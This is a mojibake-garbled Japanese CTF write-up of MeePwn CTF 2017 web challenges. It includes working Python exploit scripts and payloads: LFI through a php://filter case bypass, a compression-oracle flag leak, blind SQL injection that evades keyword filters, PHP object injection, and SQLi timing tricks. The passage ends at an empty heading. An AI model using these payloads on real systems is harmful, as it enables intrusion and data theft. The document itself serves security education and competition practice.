---
layout: post
title: MeePwn CTF 1st 2017 ã® write-up
categories: [ctf]
date: 2017-07-16 12:14:00 +0900
---

ãƒãƒ¼ãƒ  Harekaze ã§ [MeePwn CTF 1st 2017](https://ctf.meepwn.team/) ã«å‚åŠ ã—ã¾ã—ãŸã€‚æœ€çµ‚çš„ã«ãƒãƒ¼ãƒ ã§ 2049 ç‚¹ã‚’ç²å¾—ã—ã€é †ä½ã¯å¾—ç‚¹ 542 ãƒãƒ¼ãƒ ä¸­ 14 ä½ã§ã—ãŸã€‚ã†ã¡ã€ç§ã¯ 9 å•ã‚’è§£ã„ã¦ 2048 ç‚¹ã‚’å…¥ã‚Œã¾ã—ãŸã€‚

ä»¥ä¸‹ã€è§£ã„ãŸå•é¡Œã® write-up ã§ã™ã€‚

## [Web 500] TooManyCrypto

ä¸ãˆã‚‰ã‚ŒãŸ URL ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ä»»æ„ã®æ–‡å­—åˆ—ã®æš—å·åŒ–ã¨å¾©å·ãŒã§ãã‚‹ã‚µãƒ¼ãƒ“ã‚¹ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚

æš—å·åŒ–ãŒã§ãã‚‹ãƒšãƒ¼ã‚¸ã®ãƒ‘ã‚¹ã¯ `/index.php?page=encrypt` ã§ã—ãŸã€‚`encrypt.php` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ `/index.php?page=encrypt` ã¨ä¸€éƒ¨ãŒåŒã˜å†…å®¹ã§ã—ãŸã€‚LFI ãŒã§ããã†ã§ã™ã€‚

`/index.php?page=php://filter/convert.base64-encode/resource=encrypt` ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã¿ãŸã‚‚ã®ã®ã€`I hate "php" onii-chan... baka` ã¨æ€’ã‚‰ã‚Œã¦ã—ã¾ã„ã¾ã—ãŸã€‚

`php` ã‚’ `pHp` ã«å¤‰ãˆã¦ã¿ãŸã¨ã“ã‚ã€ä»Šåº¦ã¯ base64 ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸ `encrypt.php` ã®ã‚½ãƒ¼ã‚¹ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚

```php
<?php

include('./secret.php');

if(empty($_SESSION["form_token"]))
{
$gen_token=md5(uniqid(rand(), true));
$_SESSION["form_token"] = $gen_token;
//header("Refresh:0");
}

function tsu_super_encrypt0($c)
{
  return gzcompress($c,-1);
}

function tsu_super_encrypt1($c,$key)
{
    $l=strlen($key);
    $string="";
    for($i=0;$i<strlen($c);$i++)
    {
        $string[$i]=chr((ord($c[$i]) | ord($key[$i%$l])) & (256+~(ord($c[$i]) & ord($key[$i%$l])))%256);
    }
    return implode("",$string);
}

function tsu_super_encrypt2($c)
{
    $l=strlen($c);
    $string="";
    for($i=0;$i<$l;$i++)
    {
        $string[$i]=chr((ord($c[$i])+$i)%256);
    }
    return implode("",$string);
}

function tsu_super_encrypt3($c)
{
  $l=strlen($c);
  $k=$l%8;
  $string="";
  for($i=0;$i<$l;$i++)
  {
  $string[$i]=chr(((ord($c[$i])<<$k)|ord($c[$i])>>(8-$k))&0xff);
  }
  return implode("",$string);
}

?>
<html>



<?php


if(isset($_POST["enc"]) && strlen($_POST["enc"]) && isset($_POST["token"]))
{
  if($_SESSION["form_token"]===$_POST["token"])
  {
  unset($_SESSION['form_token']);
  $gen_token=md5(uniqid(rand(), true));
  $_SESSION["form_token"] = $gen_token;
  $enc=$_POST["enc"];
  $flag=$secret_salt;
  $query="secret=".$secret_salt."string=".$enc;
  $encrypted0=tsu_super_encrypt0($query);
  $encrypted1=tsu_super_encrypt1($encrypted0,$key);
  $encrypted2=tsu_super_encrypt2($encrypted1);
  $encrypted3=tsu_super_encrypt3($encrypted2); //I'm too sleepy, i think i should stop here..., oyasuminasai...mm..mm..zz..
  $final=base64_encode($encrypted3);
  echo '<pre><font color="red">Hey onii-chan...Here is your crypt...</font><font color="blue">'.$final.'</font></pre>'; 
  
  }
}
?>

<font color="red">Please give me a message...onii-chan</font>
<form action="?page=encrypt" method="POST" id="usrform">
  <center>
  <textarea rows="6" placeholder="IÃ¢Â€Â™m here for whenever you need me" class="form-control" name="enc" form="usrform"></textarea>
  <input type="hidden" name="token" value=<?php echo $_SESSION["form_token"];?> />
  <input type="submit" id="contact-submit" class="btn btn-default btn-send" value="Encrypt">
  </center>
</form>




<br>
</html>
```

`$flag=$secret_salt` ã¨ã‚ã‚‹ã®ã§ `$secret_salt` ã‚’æ‰‹ã«å…¥ã‚Œã‚Œã°ã‚ˆã•ãã†ã§ã™ã€‚

`$secret_salt` ã‚„ `$key` ã®å€¤ãŒ `secret.php` ã‹ã‚‰å¾—ã‚‰ã‚Œãªã„ã‹è€ƒãˆãŸã‚‚ã®ã®ã€`index.php` ã«ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå‡¦ç†ãŒã‚ã‚‹ãŸã‚ãƒ€ãƒ¡ãã†ã§ã™ã€‚

```php
...
if(isset($_GET["page"]) && !empty($_GET["page"]))
{
$page=$_GET["page"];
if(strpos(strtolower($page), 'secret') !== false)
    {
    die("<center><img src='./images/wrongway.jpg'/></center>");
    }
else if(strpos($page, 'php') !== false)
    {
    die("<center><img src='./images/baka.gif'/></center>");
    }
else
    {
    include($page.'.php');
    }
}
...
```

`encrypt.php` ã‚’è¦‹ã¦ã„ãã¾ã™ã€‚å…¥åŠ›ã—ãŸæ–‡å­—åˆ—ã¯ `$query="secret=".$secret_salt."string=".$enc` ã§ãƒ•ãƒ©ã‚°ã¨çµåˆã•ã‚ŒãŸå¾Œã€`tsu_super_encrypt0` ã§ `gzcompress` ã‚’ä½¿ã£ã¦åœ§ç¸®ã•ã‚Œã¦ã„ã¾ã™ã€‚ãã‚Œã‹ã‚‰ `tsu_super_encrypt1` ã§ `$key` ã¨ xorã€`tsu_super_encrypt2` ã§ `chr((ord($c[$i]) + $i) % 256)`ã€`tsu_super_encrypt3` ã§ `strlen($c) % 8` ã ã‘å·¦ã«ãƒ­ãƒ¼ãƒ†ãƒ¼ãƒˆã¨ã„ã†é †ã§æš—å·åŒ–ã•ã‚Œã¦ã„ã¾ã™ã€‚

ç›´æ¥å¾©å·ã™ã‚‹ã®ã¯å³ã—ãã†ã§ã™ãŒã€æœ€åˆã« `gzcompress` ã§åœ§ç¸®ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã€ãƒ•ãƒ©ã‚°ã®å½¢å¼ãŒ `MeePwnCTF{...}` ã§ã‚ã‚‹ã“ã¨ã‚’åˆ©ç”¨ã—ã¦ CRIME ã®è¦é ˜ã§ãƒ•ãƒ©ã‚°ã‚’æ‰‹ã«å…¥ã‚Œã‚‹ã“ã¨ãªã‚‰ã§ããã†ã§ã™ã€‚

```python
import re
import requests

def find_token(s):
  return re.findall(r'name="token" value=([0-9a-f]{32}) /', s)[0]

def get_token():
  r = requests.get(url + '?page=encrypt', cookies={'PHPSESSID': session_id})
  return find_token(r.content)

def encrypt(s, token):
  r = requests.post(url + '?page=encrypt', cookies={'PHPSESSID': session_id}, data={
    'enc': s,
    'token': token
  })
  return re.findall(r'<font color="blue">(.+)</font>', r.content)[0], find_token(r.content)

if __name__ == '__main__':
  url = 'http://128.199.190.23:8002/'
  session_id = 'xxxxxxxxxxxxxxxxxxxxxxxxxx'
  table = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_{}'

  res = 'MeePwnCTF{'
  token = get_token()
  while True:
    a = []
    for c in table:
      r, token = encrypt(res + c, token)
      r = r.decode('base64')
      a.append((len(r), c))
    a.sort(key=lambda x: x[0])
    res += a[0][1]
    print res
```

```
$ python2 solve.py
MeePwnCTF{T
MeePwnCTF{Ti
MeePwnCTF{Tim
MeePwnCTF{Tim3
MeePwnCTF{Tim3_
MeePwnCTF{Tim3_t
MeePwnCTF{Tim3_t0
MeePwnCTF{Tim3_t0w
MeePwnCTF{Tim3_t0w4
MeePwnCTF{Tim3_t0w4t
MeePwnCTF{Tim3_t0w4tc
MeePwnCTF{Tim3_t0w4tch
MeePwnCTF{Tim3_t0w4tch_
MeePwnCTF{Tim3_t0w4tch_m
MeePwnCTF{Tim3_t0w4tch_mY
MeePwnCTF{Tim3_t0w4tch_mY_
MeePwnCTF{Tim3_t0w4tch_mY_0
MeePwnCTF{Tim3_t0w4tch_mY_0n
MeePwnCTF{Tim3_t0w4tch_mY_0ni
MeePwnCTF{Tim3_t0w4tch_mY_0nii
MeePwnCTF{Tim3_t0w4tch_mY_0niic
MeePwnCTF{Tim3_t0w4tch_mY_0niich
MeePwnCTF{Tim3_t0w4tch_mY_0niicha
MeePwnCTF{Tim3_t0w4tch_mY_0niichan
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_C
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CS
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_w
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_wi
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_s
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_so
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_som
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_somE
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_somE_
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_somE_D
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_somE_D3
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_somE_D3c
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_somE_D3cR
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_somE_D3cRy
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_somE_D3cRyp
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_somE_D3cRypt
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_somE_D3cRypti
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_somE_D3cRypti0
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_somE_D3cRypti0n
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_somE_D3cRypti0n}
```

```
MeePwnCTF{Tim3_t0w4tch_mY_0niichan_CSC_win_somE_D3cRypti0n}
```

## [Web 600] Flag Shop

ä¸ãˆã‚‰ã‚ŒãŸ URL ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ãƒ­ã‚°ã‚¤ãƒ³ç”¨ã®ãƒ¦ãƒ¼ã‚¶åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã€ãƒ­ã‚°ã‚¤ãƒ³ç”¨ã¨ã¯åˆ¥ã«ã‚‚ã† 1 ã¤ãƒ¦ãƒ¼ã‚¶å (`name=buyflag`) ãŒå…¥åŠ›ã§ãã‚‹ãƒ•ã‚©ãƒ¼ãƒ ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚

ã‚½ãƒ¼ã‚¹ã‚’è¦‹ã¦ã¿ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ãƒ¦ãƒ¼ã‚¶åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒã‚³ãƒ¡ãƒ³ãƒˆã§æ›¸ã‹ã‚Œã¦ã„ã¾ã—ãŸã€‚

```html
<!-- Here is some gift 4 u. GLHF -->
<!-- ducnt/__testtest__ -->
<!-- guest/__EG-Fangay__ -->
<!-- test/__test__ -->
<!-- eesama/hoho@hihi -->
<!-- fightme/123 -->
<!-- sumail/thebest -->
<!-- messi/ronaldo -->
```

ã“ã‚Œã§ãƒ­ã‚°ã‚¤ãƒ³ã§ãã€æ‰€æŒé‡‘ã¨ãƒ•ãƒ©ã‚°ã®è³¼å…¥ã«å¿…è¦ãªãŠé‡‘ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚ãŒã€ã©ã®ãƒ¦ãƒ¼ã‚¶ã‚‚ãƒ•ãƒ©ã‚°ã‚’è²·ã†ã«ã¯ãŠé‡‘ãŒè¶³ã‚Šãªã„ã‚ˆã†ã§ã™ã€‚

ä½•ã‹æ‰‹ãŒã‹ã‚ŠãŒå¾—ã‚‰ã‚Œãªã„ã‹è©¦ã—ã« [m---/webfuck](https://github.com/m---/webfuck) ã‚’å›ã—ã¦ã¿ãŸã¨ã“ã‚ã€`index.php.bak` ã¨ã„ã†ãƒ•ã‚¡ã‚¤ãƒ«ãŒè¦‹ã¤ã‹ã‚Š `index.php` ã®ã‚½ãƒ¼ã‚¹ã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã—ãŸã€‚

```php
<?php
$servername = "there is no place like home dude!!!";
$username = "XXXXXXXXXXXXX";
$password = "XXXXXXXXXXXXX";
$dbname = "flagshop";
$conn = mysqli_connect($servername, $username, $password, $dbname);

if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

if(isset($_POST["username"]) && !empty($_POST["username"]) && isset($_POST["password"]) && !empty($_POST["password"]))
{
    $username = mysqli_real_escape_string($conn,$_POST['username']);
    $password = mysqli_real_escape_string($conn,$_POST['password']);
    $sql  = "SELECT * FROM users WHERE username='$username' AND password='$password' limit 1";
    $result = mysqli_query($conn, $sql);
    if(mysqli_num_rows($result) == 0)
        echo "<span style='color: red;'/><center><h1><tr>Nothing is easy. Go away dude!!!!</h1></center></style></span>";
    else{
        $sql1  = "SELECT * FROM buyflag WHERE username='admin' limit 1";
        $check1 = mysqli_fetch_array(mysqli_query($conn, $sql1));
        echo "<tr><center><strong><td><font color='yellow' size=8 >Need " . $check1["value"] . " gold to buy flag dude!!!</font></td>";
        echo "<tr><center><strong><td><font color=#ff3300s size=8 >==========================</font></td>";
        $sql2  = "SELECT * FROM buyflag WHERE username='$username' limit 1";
        $result2 = mysqli_fetch_array(mysqli_query($conn, $sql2));
        echo "<tr><center><strong><td><font color='red' size=8 >Hello: " . $result2["username"] . "</font></td>";
        echo "<tr><center><strong><td><font color='red' size=8 >You have: " . $result2["value"] . " gold</font></td>";
        
        if(isset($_POST['buyflag']) && !empty($_POST['buyflag']))
        {
            $buyflag=$_POST["buyflag"];
            $buyflag=preg_replace('/drop|sleep|benchmark|load|substr|substring|strcmp|union|and|offset|mid|binary|regexp|match|ord|right|locate|left|rpad|length|hex|write|join|=|-|#| |floor|=/i','~nothingisezdude~',strtolower($buyflag));
            $sql3 = mysqli_query($conn,"UPDATE buyflag SET value=value+1 WHERE username='admin'");
            $sql4 = mysqli_query($conn,"UPDATE buyflag SET value=value+1 WHERE username='$buyflag'");
        }
    }
}
mysqli_close($conn);
?>
```

`name=buyflag` ãªãƒ¦ãƒ¼ã‚¶åã®å…¥åŠ›æ¬„ã¯ã€ã©ã†ã‚„ã‚‰å…¥åŠ›ã—ãŸãƒ¦ãƒ¼ã‚¶ã¨ admin ã®æ‰€æŒé‡‘ã‚’ 1 å¢—ã‚„ã™æ©Ÿèƒ½ã®ãŸã‚ã®ã‚‚ã®ã ã£ãŸã‚ˆã†ã§ã™ã€‚

ã“ã®å…¥åŠ›æ¬„ã‚’ä½¿ã£ã¦ `UPDATE buyflag SET value=value+1 WHERE username='$buyflag'` ã®éƒ¨åˆ†ã§ SQLi ãŒã§ãã‚‹ã‚ˆã†ã§ã™ãŒã€`union` ã‚‚ `join` ã‚‚ã§ããšã€`sleep` ã‚‚ `benchmark` ã‚‚ã§ããšãªã‹ãªã‹ã¤ã‚‰ãã†ã§ã™ã€‚

Blind SQLi ã§æ”»ã‚ã¦ã„ãã¨ã—ã¦ã€ã©ã®ã‚ˆã†ã«ã—ã¦ 1 ãƒ“ãƒƒãƒˆã®æƒ…å ±ãŒæ‰‹ã«å…¥ã‚Œã‚‰ã‚Œã‚‹ã‹è€ƒãˆã¾ã™ã€‚`buyflag` ã« `' or 'A' < 'B` ãŒå…¥ã‚‹ã¨å…¨ãƒ¦ãƒ¼ã‚¶ã®æ‰€æŒé‡‘ãŒ 1 å¢—ãˆã€`' or 'A' > 'B` ã®å ´åˆã«ã¯ä½•ã‚‚å¤‰åŒ–ãŒã‚ã‚Šã¾ã›ã‚“ã€‚ã“ã‚Œã‚’åˆ©ç”¨ã—ã¦ã€ãƒ¦ãƒ¼ã‚¶ã®æ‰€æŒé‡‘ãŒå¢—ãˆãŸã‹ã©ã†ã‹ã§æƒ…å ±ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’å›é¿ã™ã‚‹æ–¹æ³•ã‚’ 1 ã¤ãšã¤è€ƒãˆã¾ã™ã€‚` ` (åŠè§’ã‚¹ãƒšãƒ¼ã‚¹) ã¯ `\t` (ã‚¿ãƒ–) ã§ä»£æ›¿ã§ãã¾ã™ã€‚çµæœã¯ ASCII ã®ç¯„å›²å†…ã§ã—ã‚‡ã†ã‹ã‚‰ã€`ord` ã¯ `ascii` ã§ä»£æ›¿ã§ãã¾ã™ã€‚`substr` ã¯ `lpad(reverse(lpad(string, index, '')), 1, '')` ã§ä»£æ›¿ã§ãã¾ã™ã€‚ã“ã‚Œã§å¤§ä½“ã¯ãªã‚“ã¨ã‹ãªã‚‹ã§ã—ã‚‡ã†ã€‚

ã§ã¯ã€ã¾ãš `version()` ã®çµæœãŒå¾—ã‚‰ã‚Œã‚‹ã‹è©¦ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```python
import re
import requests

def find_info(s):
  return re.findall(r"<font color='red' size=8\s*>(.+?)</font>", s)

def get_info():
  r = requests.post(url, data={
    'username': user,
    'password': password
  })
  return find_info(r.content)

def query(s):
  r = requests.post(url, data={
    'username': user,
    'password': password,
    'buyflag': s.replace(' ', '\t')
  })
  return find_info(r.content), get_info()

def check(r):
  return r[0][1] != r[1][1]

if __name__ == '__main__':
  url = 'http://128.199.121.135/index.php'
  user, password = 'eesama', 'hoho@hihi'

  res = ''
  i = 1
  while True:
    c = 0
    for b in range(7):
      r = check(query("' or (select ascii(lpad(reverse(lpad(version(),{},'')),1,'')) & {}) or 'A' < 'A".format(i, 1 << b)))
      if r: c |= 1 << b
    res += chr(c)
    i += 1
    print repr(res)
```

ã“ã‚Œã§ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¯ `5.7.18-0ubuntu0.16.04.1` ã¨åˆ†ã‹ã‚Šã¾ã—ãŸã€‚

`"' or (select ascii(lpad(reverse(lpad(group_concat(table_name),{},'')),1,'')) & {} from information_schema.tables where table_schema like database()) or 'A' < 'A"` ã«å¤‰ãˆã‚‹ã¨ `buyflag,flagflag7847560c748814fd3070e9149a9578bd,users` ã® 3 ã¤ã®ãƒ†ãƒ¼ãƒ–ãƒ«ãŒå­˜åœ¨ã™ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã—ãŸã€‚

`"' or (select ascii(lpad(reverse(lpad(group_concat(column_name),{},'')),1,'')) & {} from information_schema.columns where table_name like 'flag%') or 'A' < 'A"` ã«å¤‰ãˆã‚‹ã¨ `flagflag7847560c748814fd3070e9149a9578bd` ã¯ `flag` ã¨ã„ã†ãƒ†ãƒ¼ãƒ–ãƒ«ã‚’æŒã¤ã¨ã‚ã‹ã‚Šã¾ã—ãŸã€‚

ã‚ã¨ã¯ `"' or (select ascii(lpad(reverse(lpad(flag,{},'')),1,'')) & {} from flagflag7847560c748814fd3070e9149a9578bd) or 'A' < 'A"` ã«å¤‰ãˆã‚‹ã¨ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
MeePwnCTF{all_the_roads_lead_to_rome@31337}
```

## [Web 100] TSULOTT

ä¸ãˆã‚‰ã‚ŒãŸ URL ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€6 ã¤ã®æ•°ã‚’å…¥åŠ›ã—ã¦ã‚³ãƒ¼ãƒ‰ã‚’å¾—ã‚‹ãƒ•ã‚©ãƒ¼ãƒ ã¨ã€ç™ºè¡Œã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã—ã¦å½“é¸ã—ãŸã‹ã©ã†ã‹åˆ¤å®šã—ã¦ãã‚Œã‚‹ãƒ•ã‚©ãƒ¼ãƒ ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚

ã‚½ãƒ¼ã‚¹ã‚’è¦‹ã‚‹ã¨ `<!-- GET is_debug=1 -->` ã¨ã„ã†ã‚³ãƒ¡ãƒ³ãƒˆãŒã‚ã‚Šã¾ã—ãŸã€‚

`/?is_debug=1` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ã‚½ãƒ¼ã‚¹ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚

```php
...
<?php 
class Object  
{  
  var $jackpot; 
  var $enter;  
} 
?> 


<?php 

include('secret.php'); 

if(isset($_GET['input']))   
{ 
  $obj = unserialize(base64_decode($_GET['input'])); 
  if($obj) 
  { 
    $obj->jackpot = rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99);  
    if($obj->enter === $obj->jackpot) 
    { 
      echo "<center><strong><font color='white'>CONGRATULATION! You Won JACKPOT PriZe !!! </font></strong></center>". "<br><center><strong><font color='white' size='20'>".$obj->jackpot."</font></strong></center>"; 
      echo "<br><center><strong><font color='green' size='25'>".$flag."</font></strong></center><br>"; 
      echo "<center><img src='http://www.relatably.com/m/img/cross-memes/5378589.jpg' /></center>"; 

    } 
    else 
    { 
      echo "<br><br><center><strong><font color='white'>Wrong! True Six Numbers Are: </font></strong></center>". "<br><center><strong><font color='white' size='25'>".$obj->jackpot."</font></strong></center><br>"; 
    } 
  } 
  else 
  { 
    echo "<center><strong><font color='white'>- Something wrong, do not hack us please! -</font></strong></center>"; 
  } 
} 
else 
{ 
  echo ""; 
} 
?> 
<center> 
<br><h2><font color='yellow' size=8>-- TSU</font><font color='red' size=8>LOTT --</font></h2> 
<p><p><font color='white'>Input your code to win jackpot!</font><p> 
<form> 
          <input type="text" name="input" /><p><p> 
          <button type="submit" name="btn-submit" value="go">send</button> 
</form> 
</center> 
<?php 
if (isset($_GET['gen_code']) && !empty($_GET['gen_code'])) 
{ 
  $temp = new Object; 
  $temp->enter=$_GET['gen_code']; 
  $code=base64_encode(serialize($temp));  
  echo '<center><font color=\'white\'>Here is your code, please use it to Lott: <strong>'.$code.'</strong></font></center>'; 
} 
?> 
...
```

å½“é¸ã®åˆ¤å®šå‡¦ç†ã ã‘ã‚’æŠœãå‡ºã—ã¦ã¿ã¾ã™ã€‚

```php
if(isset($_GET['input']))   
{ 
  $obj = unserialize(base64_decode($_GET['input'])); 
  if($obj) 
  { 
    $obj->jackpot = rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99);  
    if($obj->enter === $obj->jackpot) 
    { 
      echo "<center><strong><font color='white'>CONGRATULATION! You Won JACKPOT PriZe !!! </font></strong></center>". "<br><center><strong><font color='white' size='20'>".$obj->jackpot."</font></strong></center>"; 
      echo "<br><center><strong><font color='green' size='25'>".$flag."</font></strong></center><br>"; 
      echo "<center><img src='http://www.relatably.com/m/img/cross-memes/5378589.jpg' /></center>"; 

    } 
...
  }
}
```

å…¥åŠ›ã—ãŸå€¤ã‚’ base64 ãƒ‡ã‚³ãƒ¼ãƒ‰ã—ã¦ç›´æ¥ unserialize ã«æ¸¡ã—ã¦ã„ã¾ã™ã€‚PHP Object Injection ãŒã§ããã†ã§ã™ã€‚

`YjoxOw` (`serialize(true)`) ã‚’å…¥åŠ›ã™ã‚‹ã¨ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
MeePwnCTF{__OMG!!!__Y0u_Are_Milli0naire_N0ww!!___}
```

## [Web 100] Br0kenMySQL

ä¸ãˆã‚‰ã‚ŒãŸ URL ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ãªã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚

```php
<title>Br0kenMySQL</title><h1><pre>
<p style='color:Red'>Br0kenMySQL</p>
<?php

if($_GET['debug']=='ğŸ•µ') die(highlight_file(__FILE__));

require 'config.php';

$link = mysqli_connect('localhost', MYSQL_USER, MYSQL_PASSWORD);

if (!$link) {
    die('Could not connect: ' . mysql_error());
}

if (!mysqli_select_db($link,MYSQL_USER)) {
    die('Could not select database: ' . mysql_error());
}
    $id = $_GET['id'];
    if(preg_match('#sleep|benchmark|floor|rand|count#is',$id))
        die('Don\'t hurt me :-(');
    $query = mysqli_query($link,"SELECT username FROM users WHERE id = ". $id);
    $row = mysqli_fetch_array($query);
    $username = $row['username'];

    if($username === 'guest'){

        $ip = @$_SERVER['HTTP_X_FORWARDED_FOR']!="" ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
        if(preg_match('#sleep|benchmark|floor|rand|count#is',$ip))
            die('Don\'t hurt me :-(');
        var_dump($ip);
        if(!empty($ip))
            mysqli_query($link,"INSERT INTO logs VALUES('{$ip}')");

        $query = mysqli_query($link,"SELECT username FROM users WHERE id = ". $id);
        $row = mysqli_fetch_array($query);
        $username = $row['username'];
        if($username === 'admin'){
            echo "What ???????\nLogin as guest&admin at the same time ?\nSeems our code is broken, here is your bounty\n";
            die(FLAG);
        }
        echo "Nothing here";
    } else {
        echo "Hello ".$username;
    }




?>
</h1>
</pre>
```

`"SELECT username FROM users WHERE id = ". $id` ã®çµæœãŒ `guest` ãªã‚‰ã‚‚ã†ä¸€åº¦ã“ã®ã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã—ã€ãã®çµæœãŒ `admin` ãªã‚‰ãƒ•ãƒ©ã‚°ã‚’è¡¨ç¤ºã™ã‚‹ã‚ˆã†ã§ã™ã€‚

2 åº¦ç›®ã®ãƒ¦ãƒ¼ã‚¶åã®ãƒã‚§ãƒƒã‚¯ã®å‰ã« IP ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ `logs` ã«è¨˜éŒ²ã—ã¦ã„ã‚‹ã®ã§ã€ã“ã‚Œã‚’åˆ©ç”¨ã—ã¦ `X-Forwarded-For` ã«ãƒ©ãƒ³ãƒ€ãƒ ãªå€¤ã‚’å…¥ã‚Œã¦ã€`logs` ã«å­˜åœ¨ã™ã‚‹ã‹ã©ã†ã‹ã§ `id` ã‚’å¤‰ãˆã‚‹ã‚ˆã†ã«ã—ã¦ã¿ã¾ã™ã€‚

```python
import random
import requests

x = str(random.random())
print requests.get('http://139.59.239.133/?id=if((select 1 from logs where ip = "{}"), 1, 2)'.format(x), headers={
  'X-Forwarded-For': x
}).content
```

```
MeePwnCTF{_b4by_tr1ck_fixed}
```

## [Web 100] Br0kenMySQL v2

Br0kenMySQL ã¨ã»ã¨ã‚“ã©åŒã˜ã§ã™ãŒã€ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã« `select|from|\(|\)` ãŒè¿½åŠ ã•ã‚Œã¾ã—ãŸã€‚

å¤‰æ•°ã«ä½•ã‹ä½¿ãˆã‚‹ã‚‚ã®ã¯ãªã„ã‹æ¢ã—ã¦ã¿ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ãªæƒ…å ±ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
root@f0234be6b01e:/# mysql -u root -p -h $MYSQL_PORT_3306_TCP_ADDR -e "show variables" > a.txt
Enter password:
root@f0234be6b01e:/# mysql -u root -p -h $MYSQL_PORT_3306_TCP_ADDR -e "show variables" > b.txt
Enter password:
root@f0234be6b01e:/# diff a.txt b.txt
387c387
< pseudo_thread_id      9
---
> pseudo_thread_id      10
491c491
< timestamp     1500173439.524841
---
> timestamp     1500173443.255130
```

`@@timestamp` ãŒä½¿ãˆãã†ã§ã™ã€‚`if` ãŒä½¿ãˆãªããªã£ã¦ã—ã¾ã£ãŸã®ã§ã€`case` ã§ä»£æ›¿ã—ã¾ã—ã‚‡ã†ã€‚

```python
import requests
import time
import urllib

while True:
  print requests.get('http://139.59.239.133/v2/?id=' + urllib.quote('case @@timestamp * 100 % 100 & 1 when 1 then 1 else 2 end')).content
  time.sleep(.1)
```

ã“ã‚Œã§ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
MeePwnCTF{_I_g1ve__uPPPPPPPP}
```

## [Web 299] Br0kenMySQL v3

